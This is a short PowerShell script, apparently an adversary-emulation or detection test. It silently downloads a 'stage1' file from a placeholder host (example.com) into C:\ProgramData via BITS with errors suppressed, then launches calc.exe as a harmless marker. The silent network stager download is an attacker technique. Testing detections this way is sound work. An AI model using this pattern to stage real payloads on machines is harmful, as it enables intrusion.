[CmdletBinding()]
param(
    [string]$TransferUrl = 'http://example.com/stage1.ps1',
    [string]$DownloadPath = "C:\ProgramData\stage1.bin",
    [int]$TransferTimeout = 10
)
Start-BitsTransfer -Source $TransferUrl -Destination $DownloadPath -ErrorAction SilentlyContinue
Start-Process -FilePath "calc.exe" -ErrorAction SilentlyContinue
$ProgressPreference = "SilentlyContinue"
$PSDefaultParameterValues["Out-File:Encoding"] = "utf8"
